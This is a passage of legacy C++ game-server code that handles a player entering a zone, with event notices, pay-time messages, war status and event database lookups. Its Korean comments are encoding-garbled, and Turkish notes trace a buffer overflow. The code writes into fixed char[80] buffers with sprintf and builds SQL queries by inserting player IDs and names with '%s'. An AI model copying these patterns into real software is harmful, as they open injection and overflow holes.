			// ¹ìŸî¶óžé ÷»» ¿ë ¿» °¡Žº ž¹·,
			// ·¡±ž ²šŽ.
			if (pVampire->isFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL))
			{
				pVampire->removeFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL);
			}
		}
		else if (CClass == Creature::CREATURE_CLASS_OUSTERS)
		{
			Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
			GCAddOusters gcAddOusters;
			makeGCAddOusters(&gcAddOusters, pOusters);

			scan(pCreature, pt.x, pt.y, &gcAddOusters);
		}
		else
		{
			throw Error("invalid creature class. must be slayer or vampire...");
		}

		// FAZ 4 (2026-05-04 oturum 2): post-login buffer overflow izolasyon.
		// crash. PartyID + addPartyMember + PAY_SYSTEM (char str[80] +
		// sprintf) candidate'lar. Granuler trace ile noktayi izole et.
		uint PartyID = pCreature->getPartyID();
		if (PartyID != 0)
		{
			m_pLocalPartyManager->addPartyMember(PartyID, pCreature);
		}

		// ¿ä± ºžž ºž¿©Ž.
		#if !defined(__CONNECT_BILLING_SYSTEM__) && ( defined(__PAY_SYSTEM_ZONE__) || defined(__PAY_SYSTEM_FREE_LIMIT__) )
			if (pCreature->isPC())
			{
				GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pCreature->getPlayer());

				// °¹æ °æ¿ì¿¡
				// ¯·á »ç¿ëžé
				// °£ Ÿóž¶ ³²ö ŸŸ» °æ¿ì¿¡ ¿ä± ºžž ¥Ž.
				if ((pGamePlayer->isPayPlaying() || pGamePlayer->isPremiumPlay())
					&& pGamePlayer->getPayType()==PAY_TYPE_TIME)
				{
					Timeval currentTime;
					getCurrentTime(currentTime);
					Timeval payTime = pGamePlayer->getPayPlayTime(currentTime);

					int usedMin = payTime.tv_sec/60;
					int remainMin = pGamePlayer->getPayPlayAvailableHours()-usedMin;

					// PC¹æº ³²º °£ 5°£(300º)  ¶§ â·
					if (pGamePlayer->getPayPlayType()==PAY_PLAY_TYPE_PCROOM)
					{
						//cout << "PC¹æ »ç¿ë°£ : " << usedMin << "/" << pGamePlayer->getPayPlayAvailableHours() << endl;

						if (remainMin <= 300)
						{
							char str[80];
                            sprintf(str, g_pStringPool->c_str( STRID_PCROOM_REMAIN_PLAY_TIME ),
                                            remainMin );
							//sprintf(str, "[PC¹æ] »ç¿ë°£ %dº ³²ŸŽŽ.", remainMin);
							GCSystemMessage gcSystemMessage;
							gcSystemMessage.setMessage(str);
							pGamePlayer->sendPacket (&gcSystemMessage);
						}
					}
					// °³º ³²º °£ 1°£(60º)  ¶§ â·
					else if (pGamePlayer->getPayPlayType()==PAY_PLAY_TYPE_PERSON)
					{
						if (remainMin <= 60)
						{
							char str[80];
                            sprintf( str, g_pStringPool->c_str( STRID_PERSONAL_REMAIN_PLAY_TIME ),
                                            remainMin );
							//sprintf(str, "[°³] »ç¿ë°£ %dº ³²ŸŽŽ.", remainMin);
							GCSystemMessage gcSystemMessage;
							gcSystemMessage.setMessage(str);
							pGamePlayer->sendPacket (&gcSystemMessage);
						}
					}
				}
			}
		#endif

		// º±âµ
		if (isMasterLair() && m_pMasterLairManager!=NULL)
		{
			MasterLairInfo* pInfo = g_pMasterLairInfoManager->getMasterLairInfo( getZoneID() );
		    Assert(pInfo!=NULL);

			if (m_pMasterLairManager->getCurrentEvent()==MasterLairManager::EVENT_WAITING_PLAYER)
			{
				// ¿¬û º±âµ å®°¡ Ž °æ¿ì¿¡ Ÿ·Ž.
				if (m_pEffectManager->findEffect( Effect::EFFECT_CLASS_CONTINUAL_GROUND_ATTACK )!=NULL)
				{
					GCNoticeEvent gcNoticeEvent;
					gcNoticeEvent.setCode( NOTICE_EVENT_CONTINUAL_GROUND_ATTACK );
					gcNoticeEvent.setParameter( pInfo->getStartDelay() );   // 

					broadcastPacket( &gcNoticeEvent );
				}
			}
		}

		//-----------------------------------------------------------------
		// ± û¿ëµŽ °æ¿ì
		//-----------------------------------------------------------------
/*		if (isCastle())
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	

			int itemTaxRatio = g_pCastleInfoManager->getItemTaxRatio( pPC );

			if (itemTaxRatio > 100)
			{
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_SHOP_TAX_CHANGE );
				gcNoticeEvent.setParameter( (uint)itemTaxRatio );

				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}
		}*/

		//-----------------------------------------------------------------
		// üï  °æ¿ìŽ üïºžž ºž³»Ž.
		//-----------------------------------------------------------------
		if (g_pWarSystem->isWarActive())
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			g_pWarSystem->sendGCWarList( pPC->getPlayer() );
		}

		if ( g_pFlagManager->hasFlagWar() && g_pFlagManager->isFlagAllowedZone( getZoneID() ) )
		{
			Player* pPlayer = pCreature->getPlayer();
			if ( pPlayer != NULL ) pPlayer->sendPacket( g_pFlagManager->getStatusPacket() );
		}

		if ( m_pLevelWarManager != NULL && m_pLevelWarManager->hasWar() )
		{
			// ·¹º§º° üï žé ž°¡ ºž³»Ÿ µ µí
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			m_pLevelWarManager->sendGCWarList( pPC->getPlayer() );
#ifdef __CONTRIBUTION_SYSTEM__
			// HolyLandManager ¿¡ ¯ú PC ºžž °¡Ž.
			pPC->addLevelWarCheckPoint(); // º­ü â

#endif
		}

		//-----------------------------------------------------------------
		// ŸŽã ºö¿¡ µéŸî¿ °æ¿ìŽ å®ž »·Ž.
		//-----------------------------------------------------------------
		// ü¿¡ Žø ž» ©Ÿ µ° °°ºµ¥? -_-;
		//-----------------------------------------------------------------
		//if (isHolyLand())
		//{
		sendHolyLandWarpEffect( pCreature );
		//}

		// FAZ 4 (2026-05-04 oturum 2): isHolyLand branch granuler trace.
		// Crash "post sendHolyLandWarpEffect, pre isHolyLand check" sonrasi
		// sessizdi — branch icindeki sendBloodBibleStatus / sendPacket /
		// makeHolyLandBonusInfo candidate'lar.
		bool bHL = isHolyLand();
		if (bHL)
		{
			bool bRaceWar = g_pWarSystem->hasActiveRaceWar();
			if ( bRaceWar )
			{
				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				g_pShrineInfoManager->sendBloodBibleStatus( pPC );

				pPC->getPlayer()->sendPacket( RegenZoneManager::getInstance()->getStatusPacket() );
#ifdef __CONTRIBUTION_SYSTEM__
				// HolyLandManager ¿¡ ¯ú PC ºžž °¡Ž.
				pPC->addHolyWarCheckPoint(); // º­ü â

#endif
			}
			else
			{
				GCHolyLandBonusInfo gcHolyLandBonusInfo;
				g_pBloodBibleBonusManager->makeHolyLandBonusInfo( gcHolyLandBonusInfo );
				pCreature->getPlayer()->sendPacket( &gcHolyLandBonusInfo );
			}
		}

		bool bSweeperAble = g_pSweeperBonusManager->isAble( getZoneID() );
		if ( bSweeperAble )
		{
			bool bBonusZone = g_pLevelWarZoneInfoManager->isCreatureBonusZone( pCreature, getZoneID() );
			if (bBonusZone)
			{
				GCSweeperBonusInfo gcSweeperBonusInfo;
				g_pSweeperBonusManager->makeSweeperBonusInfo( gcSweeperBonusInfo );
				pCreature->getPlayer()->sendPacket( &gcSweeperBonusInfo );
//			pCreature->setFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
			}
		}
/*
		// 2007 01 03 º§ ºž³º ºžž Ž ºž³»Ž
		GCSweeperBonusInfo gcSweeperBonusInfo;
		g_pSweeperBonusManager->makeSweeperBonusInfo( gcSweeperBonusInfo );
		pCreature->getPlayer()->sendPacket( &gcSweeperBonusInfo );
*/
		// Player ¿¡° GCItemNameInfoList ¶» ºž³»Ž
/*		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	
		if ( !pPC->isEmptyItemNameInfoList() )
		{
			GCItemNameInfoList	gcItemNamInfoList;
			makeGCItemNameInfoList( &gcItemNamInfoList, pPC );

			pPC->getPlayer()->sendPacket( &gcItemNamInfoList );
		}*/

		// PKž¿¡­ Ÿî­ µ»ìŸ³ªŽ °æ¿ì º° å®°¡ ºŽŽ.
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION ) )
		{
			Effect* pEffect = pCreature->findEffect( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION );
			if ( pEffect != NULL )
			{
				// Effect°¡ ³¡³ª­ »ç¶óú ¶§ º° å® º¿©¶óŽ ¶ ³¯¶ó°£Ž.
				pEffect->setDeadline(0);
			}
			else
			{
				pCreature->removeFlag( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION );
			}
		}

		// ž· »ýºµ ³¶óžé ž°¡ž ºž³»Ž.
		// FAZ 4 (2026-05-04 oturum 3): granuler trace — buffer overflow
		// bu branch icinde. pPC->getName() CJK karakter ise save() icinde
		// strcpy/sprintf overflow, ya da sendPacket char buffer.
		bool bNotJustCreated = pPC->getFlagSet()->isOn(FLAGSET_NOT_JUST_CREATED);
		if ( bNotJustCreated )
		{
			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_WELCOME_MESSAGE );
			pPC->getPlayer()->sendPacket( &gcNoticeEvent );

			pPC->getFlagSet()->turnOff(FLAGSET_NOT_JUST_CREATED);
			pPC->getFlagSet()->save(pPC->getName());

			GCNoticeEvent gcNoticeEvent2;
			gcNoticeEvent2.setCode( NOTICE_EVENT_LOGIN_JUST_NOW );
			gcNoticeEvent2.setParameter( g_pVariableManager->getHeadPriceBonus() );

			pPC->getPlayer()->sendPacket( &gcNoticeEvent2 );

			pPC->setFlag( Effect::EFFECT_CLASS_JUST_LOGIN );

			if ( g_pVariableManager->getVariable(CHOBO_EVENT) )
			{
				pPC->getGQuestManager()->getGQuestInventory().saveOne(pPC->getName(),13);
				pPC->getPlayer()->sendPacket( pPC->getGQuestManager()->getGQuestInventory().getInventoryPacket() );
				gcNoticeEvent.setCode( NOTICE_EVENT_GIVE_PRESENT_1 );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

#ifdef __METRO_SERVER__
			if ( g_pVariableManager->getVariable(EVENT_LEVELUP_200604) != 0 )
			{
				// ·¹º§Ÿ÷ º¥®¿ë ºž »ýº
				Statement* pStmt = NULL;
				BEGIN_DB
				{
					pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
					pStmt->executeQuery( "REPLACE INTO EventLevelUp VALUES ( '%s', '%s', %d, 0, 0, 0 )", pPC->getPlayer()->getID().c_str(), pPC->getName().c_str(), (int)pPC->getRace()+1 );

					SAFE_DELETE( pStmt );
				}
				END_DB( pStmt )
			}

			{
				Statement* pStmt = NULL;
				BEGIN_DB
				{
					pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
					pStmt->executeQuery( "REPLACE INTO RedistributeAttr50Count VALUES ( '%s', '%s', %d, 50 )", pPC->getPlayer()->getID().c_str(), pPC->getName().c_str(), (int)pPC->getRace()+1 );

					SAFE_DELETE( pStmt );
				}
				END_DB( pStmt )
			}
#endif
		}
		else if ( !pPC->isFlag( Effect::EFFECT_CLASS_JUST_LOGIN ) )
		{
#ifdef __METRO_SERVER__
			// ¹é º¥® ±°í
			Statement* pStmt = NULL;
			Result* pResult = NULL;
			BEGIN_DB
			{
				if ( g_pVariableManager->getVariable(EVENT_COMEBACK_200604) != 0 )
				{
					pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();
					pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200604 WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

					if ( pResult->next() )
					{
						GCNPCResponse response;
						response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
						response.setParameter( YOU_CAN_GET_EVENT_COMEBACK_200604_ITEM );
						pPC->getPlayer()->sendPacket( &response );
					}

					pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200604 WHERE PlayerID = '%s' AND PayPremiumDate <> '0000-00-00' AND RecvPremiumItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

					if ( pResult->next() )
					{
						GCNPCResponse response;
						response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
						response.setParameter( YOU_CAN_GET_EVENT_COMEBACK_200604_PREMIUM_ITEM );
						pPC->getPlayer()->sendPacket( &response );
					}

					SAFE_DELETE( pStmt );
				}

				/*
				pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();
				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Main WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Main WHERE PlayerID = '%s' AND PayPremiumDate <> '0000-00-00' AND RecvPremiumItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_PREMIUM_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Recommend WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_RECOMMEND_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200507Main WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200507_COMEBACK_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200507Main WHERE PlayerID = '%s' AND PayPremiumDate <> '0000-00-00' AND RecvPremiumItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200507_COMEBACK_PREMIUM_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200507Recommend WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200507_COMEBACK_RECOMMEND_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}
				*/
			}
			END_DB(pStmt);
#endif

			if ( g_pVariableManager->getVariable( TODAY_IS_HOLYDAY ) )
			{
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_HOLYDAY );
				gcNoticeEvent.setParameter( g_pVariableManager->getVariable( TODAY_IS_HOLYDAY ) );

				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

//			if ( canEnterBeginnerZone( pPC ) && getZoneID() != 1122 )
			if ( canEnterBeginnerZone( pPC ) )
			{
				int year = VSDate::currentDate().year() - 2000;
				int month = VSDate::currentDate().month();
				int day = VSDate::currentDate().day();
				int hour = VSTime::currentTime().hour();
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_ENTER_BEGINNER_ZONE );
				gcNoticeEvent.setParameter( (year * 1000000) + (month * 10000) + (day * 100) + hour );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

			if ( g_pVariableManager->isWarActive() && g_pVariableManager->isAutoStartRaceWar() && g_pWarSystem->isRaceWarToday() )
			{
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_RACE_WAR_SOON );
				gcNoticeEvent.setParameter( g_pWarSystem->getRaceWarTimeParam() );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

			if ( g_pVariableManager->isActiveLevelWar() )
			{
				ZoneID_t levelWarZoneId = g_pLevelWarZoneInfoManager->getCreatureZoneID( pCreature );

//				cout << "ZoneID : " << levelWarZoneId << endl;
				if ( levelWarZoneId != 1 )
				{
					Zone* pLevelZone = getZoneByZoneID(levelWarZoneId);
					Assert( pLevelZone != NULL );

					LevelWarManager* pLevelWarManager = pLevelZone->getLevelWarManager();
					Assert( pLevelWarManager != NULL );
					
					if ( pLevelWarManager->hasToDayWar() )
					{
						int year = VSDate::currentDate().year() - 2000;
						int month = VSDate::currentDate().month();
						int day = VSDate::currentDate().day();
						int hour = VSTime::currentTime().hour();
						int level = 0;
						if (levelWarZoneId == 1131)
						level = 1;
						else if (levelWarZoneId == 1132)
						level = 2;
						else if (levelWarZoneId == 1133)
						level = 3;
						else if (levelWarZoneId == 1134)
						level = 4;

						GCNoticeEvent gcNoticeEvent;
						gcNoticeEvent.setCode( NOTICE_EVENT_LEVEL_WAR_ARRANGED );
//						gcNoticeEvent.setParameter( ((DWORD)((DWORD)month << 24)) | ((DWORD)((DWORD)day << 16)) | ((DWORD)((DWORD)hour << 8)) | ((DWORD)((DWORD)level)) );
						gcNoticeEvent.setParameter( (level * 100000000) + (year * 1000000) + (month * 10000) + (day * 100) + hour );
						pPC->getPlayer()->sendPacket( &gcNoticeEvent );
					}

				}
			}

			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_LOGIN_JUST_NOW );
			gcNoticeEvent.setParameter( g_pVariableManager->getHeadPriceBonus() );

			pPC->getPlayer()->sendPacket( &gcNoticeEvent );

			pPC->setFlag( Effect::EFFECT_CLASS_JUST_LOGIN );
		}
//1217 wlzzi - ¯µ ê » ¶§ ê ºž : Summonºžž 1· ºž³»µµ·..
//		if ( pPC->getPetInfo() != NULL ) sendPetInfo( pGamePlayer );
		if ( pPC->getPetInfo() != NULL ) sendPetInfo( pGamePlayer, false, 2 );
		
		// ž µ¿¶§  ³ŸîŽ ¶
		Packet* pNicknamePacket = pPC->getNicknameBook()->getNicknameBookListPacket();
		pPC->getPlayer()->sendPacket( pNicknamePacket );
		SAFE_DELETE( pNicknamePacket );

		pPC->getGQuestManager()->refreshQuest(false);

		Packet* pGQuestPacket = pPC->getGQuestManager()->getStatusInfoPacket();
		pPC->getPlayer()->sendPacket( pGQuestPacket );
		SAFE_DELETE( pGQuestPacket );

		pGQuestPacket = pPC->getGQuestManager()->getGQuestInventory().getInventoryPacket();
		pPC->getPlayer()->sendPacket( pGQuestPacket );

		// GCUnionOfferList
		//

		GCUnionOfferList	gcUnionOfferList;
		
		{
			GuildUnion *pUnion = GuildUnionManager::Instance().getGuildUnion( pPC->getGuildID() );
			if(pUnion != NULL)
			{
			//	cout << "GuildUNION : Union Ž PlayerCreature" << endl;

				if( g_pGuildManager->isGuildMaster ( pPC->getGuildID(), pPC ) )
			//		cout << "GuildUNION : PC°¡ GuildMasterŽ" << endl;
			
				if( pUnion->getMasterGuildID() == pPC->getGuildID() )
			//		cout << "GuildUNION : ¿¬ ž¶º ±æµå°¡ ³» ±æµåŽ" << endl;
				
				// ¿ä»³ð ö°¡  ±æµå ž¶º°¡? || ¿¬ ž¶º±æµå°¡ ³» ±æµå°¡ ž³ª?
				if( g_pGuildManager->isGuildMaster ( pPC->getGuildID(), pPC )
					&& pUnion->getMasterGuildID() == pPC->getGuildID() )
				{
			//		cout << "±·¯žé..OfferListž žžµéŸî­ ºž³».." << endl;

					if(GuildUnionOfferManager::Instance().makeOfferList(pUnion->getUnionID(), gcUnionOfferList ))
					{
						pPC->getPlayer()->sendPacket( &gcUnionOfferList );
					}
					
				}
			}
		}
		
		if ( g_pWarSystem->isSkyBlack() )
		{
			GCNoticeEvent gcNE;
			gcNE.setCode(NOTICE_EVENT_RACE_WAR_IN_5);
			pPC->getPlayer()->sendPacket( &gcNE );
		}

		GCMyStoreInfo myStoreInfo;
		myStoreInfo.setStoreInfo( &(pPC->getStore()->getStoreInfo()) );
		myStoreInfo.setOpenUI(0);
		pPC->getPlayer()->sendPacket( &myStoreInfo );
	
		//pPC->getPlayer()->sendPacket( &gcUnionOfferList );
		
/*		GCNoticeEvent gcNoticeEvent;
		gcNoticeEvent.setCode( NOTICE_EVENT_CROWN_PRICE );
		gcNoticeEvent.setParameter( g_pVariableManager->getVariable(CROWN_PRICE) );
		pPC->getPlayer()->sendPacket( &gcNoticeEvent );*/
		
		this->NotifyAfterEnterZone(pCreature);
	} 
	else 
	{
		ZoneCoord_t tempX = Random(20, m_Width);
		ZoneCoord_t tempY = Random(20, m_Height);
		addPC(pCreature, tempX, tempY, 0);

		// žº«¿î® ö³ªµµ žø £º °æ¿ì Assert
		//throw EmptyTileNotExistException("too many pc in this zone.. or too unlucky");
	}
	
	{
		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
		pPC->NotifyZoneToMove();
	}


	__END_PROFILE_ZONE("Z_ADD_PC")

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// detect invisibilityµî ¿°ú°¡ »ç¶óø °æ¿ì..ºžŽ ³ð Ÿºž° µ °æ¿ì
// pCreature¿¡° GCDeleteObjectž ºž³»Ž. ºž°í Žø invisible creaturež
// deleteŽ. ¶Ž ŸºžŽ ³ ºž° µ °æ¿ìµî..
//////////////////////////////////////////////////////////////////////////////
/*void Zone::updateInvisibleScan(Creature* pCreature)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	// Revealer å®ž °¡®¿Ž.
//	EffectRevealer* pEffectRevealer = NULL;
//	if ( pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
//	{
//		pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect(Effect::EFFECT_CLASS_REVEALER));
//		Assert( pEffectRevealer != NULL );
//	}

	// ObservingEey å®ž °¡®¿Ž.
	EffectObservingEye* pEffectObservingEye = NULL;
	if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
	{
		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
		//Assert( pEffectObservingEye != NULL );
	}

	EffectGnomesWhisper* pEffectGnomesWhisper = NULL;
	// GnomesWhisper å®ž °¡®¿Ž.
	if ( pCreature->isFlag(Effect::EFFECT_CLASS_GNOMES_WHISPER) )
	{
		pEffectGnomesWhisper = dynamic_cast<EffectGnomesWhisper*>(pCreature->findEffect(Effect::EFFECT_CLASS_GNOMES_WHISPER));
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			// darkness¿µ¿ª ¶»ç.
			// »ç pCreatureŽ Žç¿¬÷ slayerŽ.(updateInvisibleScan¹·..)
			if (pCreature->isSlayer() || pCreature->isOusters())
			{
				const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
				list<Object*>::const_iterator itr = objectList.begin();

				for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{
					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);

						// ±â  °æ¿ì ë°ú
						if ( pCreature == pPC 
							|| pPC->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;

						// ûŸîŽ Žë»ó¿¡ Žë­..
						// SNIPING³ª INVISIBILITY»ó °æ¿ì.
						if (pPC->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) && pCreature->getVisionState(ix,iy) >= IN_SIGHT)
						{
							// Detect Invisibility å®°¡ °³ª ¹ìŸîžé º ö Ž
							// ObservingEye å®°¡ » °æ¿ì »óŽë¹æ» º ö Ž ·¹º§¶óžé
							if ( pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || pCreature->isVampire() 
								|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pPC ) ) 
								|| ( pEffectGnomesWhisper != NULL && pEffectGnomesWhisper->canSeeInvisibility() ) 
							)
							{
								if (pPC->isVampire())
								{
									Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
									GCAddVampire gcAddVampire;

									makeGCAddVampire(&gcAddVampire, pVampire);
									pPlayer->sendPacket(&gcAddVampire);
								}
								else if (pPC->isMonster())
								{
									Monster* pMonster= dynamic_cast<Monster*>(pPC);
									//GCAddMonster gcAddMonster;
									//makeGCAddMonster(&gcAddMonster, pMonster);
									//pPlayer->sendPacket(&gcAddMonster);

									// by sigi
									Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pCreature );

									if (pAddMonsterPacket!=NULL)
									{
										pPlayer->sendPacket(pAddMonsterPacket);

										delete pAddMonsterPacket;
									}
								}
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						} 
						else if (pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
						{
							if ( (!pCreature->isVampire() && pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) )
//								|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pPC ) ) )
							{
								if (pPC->isSlayer())
								{
									Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
									
									GCAddSlayer gcAddSlayer;
									makeGCAddSlayer(&gcAddSlayer, pSlayer);
									pPlayer->sendPacket(&gcAddSlayer);
								}
								else 
								{
									throw Error("¹ìŸî°¡ º³ª žðµå¿¡ Ž. ¹á~");
								}
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}*/

//--------------------------------------------------------------------------------
// update hidden scan
// detect hiddenµî ¿°ú°¡ »ç¶óø °æ¿ì..ºžŽ ³ð Ÿºž° µ °æ¿ì
// pCreature¿¡° GCDeleteObjectž ºž³»Ž.
// ºž°í Žø burrow creaturež deleteŽ. ¶Ž ŸºžŽ ³ ºž° µ °æ¿ìµî..
// ABCD
//--------------------------------------------------------------------------------
/*void Zone::updateHiddenScan(Creature* pCreature)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	// Revealer å®ž °¡®¿Ž.
//	EffectRevealer* pEffectRevealer = NULL;
//	if ( pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
//	{
//		pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect(Effect::EFFECT_CLASS_REVEALER));
//		Assert( pEffectRevealer != NULL );
//	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			// darkness¿µ¿ª ¶»ç.
			// »ç pCreatureŽ Žç¿¬÷ slayerŽ.(updateHiddenScan¹·..)
			if (pCreature->isSlayer())
			{
				const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

				for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{

					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);
						
						// ±â  °æ¿ì ë°ú
						if ( pCreature == pPC ) continue;

						// ûŸîŽ Žë»ó¿¡ Žë­..
						if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE) && 
								pCreature->getVisionState(ix,iy) >= IN_SIGHT)
						{
							if ( pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) || pCreature->isVampire()  )
//								|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pPC ) ) )
							{
								GCAddBurrowingCreature gcABC;
								gcABC.setObjectID(pPC->getObjectID());
								gcABC.setName(pPC->getName());
								gcABC.setX(ix);
								gcABC.setY(iy);
								pPlayer->sendPacket(&gcABC);
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}*/


//////////////////////////////////////////////////////////////////////////////
